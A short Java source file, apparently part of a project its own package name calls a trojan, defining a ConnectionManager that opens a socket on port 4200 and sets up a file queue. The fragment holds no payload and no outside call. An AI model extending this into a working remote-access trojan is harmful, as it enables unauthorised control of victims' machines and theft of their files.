package dev.px.trojan.Impl;

import dev.px.trojan.Connections.ConnectionSocket;
import dev.px.trojan.Connections.FileQueue;

public class ConnectionManager {

    private ConnectionSocket connectionSocket;
    private FileQueue fileQueue;

    public ConnectionManager() {
        try {
            this.connectionSocket = new ConnectionSocket(4200);
            this.fileQueue = new FileQueue();
        } catch (Exception e) {e.printStackTrace();}

    }

}
